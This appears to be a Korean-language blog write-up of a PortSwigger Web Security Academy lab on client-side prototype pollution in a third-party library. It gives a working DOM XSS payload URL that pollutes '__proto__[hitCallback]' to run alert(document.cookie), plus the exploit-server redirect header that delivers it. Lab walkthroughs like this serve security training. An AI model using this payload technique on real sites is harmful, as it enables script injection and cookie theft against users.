---
layout: post
title: "Burp Academy-Prototype Pollution 세번째 문제:Client-side prototype pollution in third-party libraries"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, Prototype Pollution]
toc: true
---


# 개요
- 프로토타입 폴루션(Prototype Pollution, 프로토타입 오염) 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/prototype-pollution/finding/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries
- 프로토타입 폴루션 설명 주소
1. https://portswigger.net/web-security/prototype-pollution
2. https://portswigger.net/web-security/prototype-pollution/finding
- 난이도: PRACTITIONER (중간)

# 문제 설명

```
This lab is vulnerable to DOM XSS via client-side prototype pollution. This is due to a gadget in a third-party library, which is easy to miss due to the minified source code. Although it's technically possible to solve this lab manually, we recommend using DOM Invader as this will save you a considerable amount of time and effort.

To solve the lab:

1. Use DOM Invader to identify a prototype pollution and a gadget for DOM XSS.
2. Use the provided exploit server to deliver a payload to the victim that calls alert(document.cookie) in their browser.

This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out Widespread prototype pollution gadgets by Gareth Heyes.
```

# 취약점이 있는 곳 찾기 
이 문제부터는 `Dom Invader`를 사용할 필요가 있다. 자세한 설명은 [여기](https://portswigger.net/burp/documentation/desktop/tools/dom-invader){:target="_blank"}에 있다. 



`alert(document.cookie)` 를 실행하기 위해서 다음과 같이 만든다. 

```
https://0ab5005a046b393dc567ebbb00b1000a.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29
```


![dom invader 켜기](/images/burp-academy-prototype-pollution-3-enable-dom-invader.png)

![dom invader](/images/burp-academy-prototype-pollution-3-enable-dom-invader-prototype-pollution.png)

![dom invader](/images/burp-academy-prototype-pollution-3-find-dom-invader-synk-processing.png)

![dom invader](/images/burp-academy-prototype-pollution-3-find-dom-invader-synk-result.png)

![dom invader](/images/burp-academy-prototype-pollution-3-find-dom-invader-synk.png)

![dom invader](/images/burp-academy-prototype-pollution-3-test-payload.png)


헤드는 다음과 같다. 
```
HTTP/1.1 302 OK
Content-Type: text/html; charset=utf-8
Location: https://0ab5005a046b393dc567ebbb00b1000a.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29
```


